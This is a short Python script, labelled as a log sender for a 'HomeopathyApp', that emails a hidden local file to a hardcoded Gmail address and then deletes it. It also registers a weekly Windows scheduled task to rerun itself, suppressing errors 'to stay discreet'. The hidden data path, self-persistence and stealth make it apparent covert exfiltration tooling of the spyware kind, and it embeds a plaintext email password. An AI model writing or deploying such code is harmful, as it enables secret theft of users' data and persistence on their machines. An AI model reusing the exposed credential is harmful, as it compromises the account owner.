import smtplib
import os
import sys
from pathlib import Path
from email.message import EmailMessage
import subprocess

# Configuration
LOG_PATH = Path(__file__).parent / ".cache" / ".sysdata"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_FROM = "rcuisset69@gmail.com"
EMAIL_TO = "rcuisset69@gmail.com"
EMAIL_SUBJECT = "Logs HomeopathyApp"
EMAIL_USER = "rcuisset69@gmail.com"
EMAIL_PASS = "nsonjvbucvshpgaj"

def send_log():
    if not LOG_PATH.exists():
        print("Aucun fichier de log à envoyer.")
        return

    with open(LOG_PATH, "rb") as f:
        log_data = f.read()

    msg = EmailMessage()
    msg["From"] = EMAIL_FROM
    msg["To"] = EMAIL_TO
    msg["Subject"] = EMAIL_SUBJECT
    msg.set_content("Veuillez trouver en pièce jointe le fichier de logs HomeopathyApp.")
    msg.add_attachment(log_data, maintype="text", subtype="plain", filename="app.log")

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_USER, EMAIL_PASS)
        server.send_message(msg)
        print("Log envoyé par email.")

    # Suppression du fichier après envoi
    os.remove(LOG_PATH)
    print("Log supprimé.")

def schedule_self():
    script_path = str(Path(__file__).resolve())
    task_name = "HomeopathyLogSender"
    # Exécute chaque lundi à 10h
    cmd = [
        "schtasks",
        "/Create",
        "/SC", "WEEKLY",
        "/D", "MON",
        "/TN", task_name,
        "/TR", f'"{sys.executable}" "{script_path}"',
        "/ST", "10:00",
        "/F"
    ]
    try:
        subprocess.run(" ".join(cmd), shell=True, check=True)
    except Exception as e:
        pass  # Ne rien afficher pour rester discret

if __name__ == "__main__":
    send_log()
    schedule_self()
